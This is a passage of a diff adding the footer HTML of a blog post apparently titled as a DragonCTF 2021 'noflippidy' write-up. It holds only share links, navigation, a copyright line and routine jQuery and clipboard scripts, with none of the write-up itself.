+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/01/22/Drangonctf2021-noflippidy/&text=Drangonctf2021-noflippidy"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/01/22/Drangonctf2021-noflippidy/&title=Drangonctf2021-noflippidy"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/01/22/Drangonctf2021-noflippidy/&is_video=false&description=Drangonctf2021-noflippidy"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Drangonctf2021-noflippidy&body=Check out this article: http://example.com/2022/01/22/Drangonctf2021-noflippidy/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/01/22/Drangonctf2021-noflippidy/&title=Drangonctf2021-noflippidy"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/01/22/Drangonctf2021-noflippidy/&title=Drangonctf2021-noflippidy"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/01/22/Drangonctf2021-noflippidy/&title=Drangonctf2021-noflippidy"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/01/22/Drangonctf2021-noflippidy/&title=Drangonctf2021-noflippidy"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/01/22/Drangonctf2021-noflippidy/&name=Drangonctf2021-noflippidy&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/01/22/Drangonctf2021-noflippidy/&t=Drangonctf2021-noflippidy"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2022
+    nich0las
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/projects_url">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
